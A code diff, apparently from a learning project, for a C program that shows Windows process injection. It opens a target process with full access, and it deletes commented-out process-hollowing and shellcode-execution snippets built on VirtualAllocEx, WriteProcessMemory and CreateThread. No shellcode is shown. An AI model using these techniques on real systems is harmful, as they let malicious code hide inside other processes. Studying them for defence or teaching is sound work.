@@ -39,13 +39,12 @@ int main(int argc,char *argv[]){
 	
 	//this code snippet explains how process injection works
 	DWORD PID;
-	PID=atoi(argv[1]);
-	
 	HANDLE hProcess;
 	HANDLE hThread;
 	HANDLE hVictimThread;
 	void *exec_mem;
-	
+
+	PID=atoi(argv[1]);
 	printf("[+] trying to open a handle to process (%ld)\n",PID);
 	hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,PID);
 	if(hProcess==NULL){
@@ -67,53 +66,5 @@ int main(int argc,char *argv[]){
 	printf("[+] cleaning up..\n");
 	CloseHandle(hThread);
 	CloseHandle(hProcess);
-	
-	/*
-	//this code snippet explains how process hollowing works
-	
-	
-	void *exec_mem;
-	STARTUPINFOA *startupinfo=malloc(1*sizeof(STARTUPINFOA));
-	PROCESS_INFORMATION *procinfo=malloc(1*sizeof(PROCESS_INFORMATION));
-    ZeroMemory(startupinfo, sizeof(STARTUPINFOA));
-    ZeroMemory(procinfo, sizeof(PROCESS_INFORMATION));
-	if(CreateProcessA("C:\\Windows\\notepad.exe",NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,startupinfo,procinfo) == 0){
-		printf("[x] Failed to create process,error (%ld)\n",GetLastError());
-		exit(1);			
-	};
-	// hProcess.procinfo -> handle
-	exec_mem=VirtualAllocEx(procinfo->hProcess,NULL,sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);
-	WriteProcessMemory(procinfo->hProcess,exec_mem,shellcode,sizeof(shellcode),NULL);
-	if (ResumeThread(procinfo->hThread) == -1){
-		printf("[x] Failed to resume process,error (%ld)\n",GetLastError());
-		exit(1);		
-	}
-	
-	free(startupinfo);
-	free(procinfo);
-	
-	*/
-	
-	
-	
-	/*
-	//this code snippet explains how shellcode execution works
-	//we won't need it cause we already injecting a process.
-	
-	void *exec=VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-	printf("[+] memcpy\n");
-	memcpy(exec,shellcode,sizeof(shellcode));
-	//RtlMoveMemory(exec,shellcode,sizeof(shellcode));
-	printf("[+] memcpy success\n");
-	((void(*)())exec)(); //exec shellcode
-	
-	//printf("[+] create thread");
-
-	
-	if ( CreateThread(NULL,0,(LPTHREAD_START_ROUTINE) exec,NULL,0,NULL) == NULL){printf("[x] THREAD FAILED.\n");}
-	printf("[+] thread created\n");
-	printf("[+]EXECUTION SUCCEEDED\n");
-	*/
-	
 	return 0;
 }
